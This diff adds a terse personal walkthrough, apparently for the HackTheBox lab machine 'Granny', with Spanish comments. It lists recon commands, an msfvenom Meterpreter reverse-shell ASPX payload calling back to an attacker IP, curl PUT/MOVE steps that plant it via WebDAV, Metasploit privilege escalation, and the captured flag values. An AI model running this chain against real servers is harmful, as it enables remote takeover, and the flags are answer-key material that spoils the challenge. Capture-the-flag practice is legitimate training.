@@ -1,0 +1,45 @@
+VM 3 - G ranny
+
+10.10.10.15 GRANNY - 
+
+https://htb.hackproof.tech/2020/04/10101015-granny-hackthebox-machine.html
+https://ech1.netlify.app/htb/easy/8
+
+nmap -A 10.10.10.15
+
+davtest -url http://10.10.10.15
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=1337 -f aspx > zishan.aspx
+
+#dejar arhcivo malicioso en el endpoint
+curl -X PUT http://10.10.10.15/zishan.txt --data-binary @zishan.aspx
+
+curl -X MOVE -H 'Destination: https://10.10.10.15/zishan.aspx' https://10.10.10.15/zishan.txt
+
+
+sudo msfdb init && msfconsole
+
+msf5 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+
+#Sí sale bien el meterpreter, ya tenemos acceso root
+
+curl http://10.10.10.15/zishan.aspx
+
+#en msf
+post/multi/recon/local_exploit_suggester -- exploit/windows/local/ms14_058_track_popup_menu
+
+cat 'C:\Documents and Settings\Lakis\Desktop\user.txt'".
+cat 'C:\Documents and Settings\Administrator\Desktop\root.txt'"
+
+1. user.txt flag: 700c5dc163014e22b3e408f8703f67d1
+2. root.txt flag: aa4beed1c0584445ab463a6747bd06e9 
+
+
+References:
+1. https://forum.hackthebox.eu/discussion/54/granny-retired-box-hint-request
+Videos:
+1. Ippsec walkthough: https://www.youtube.com/watch?v=ZfPVGJGkORQ
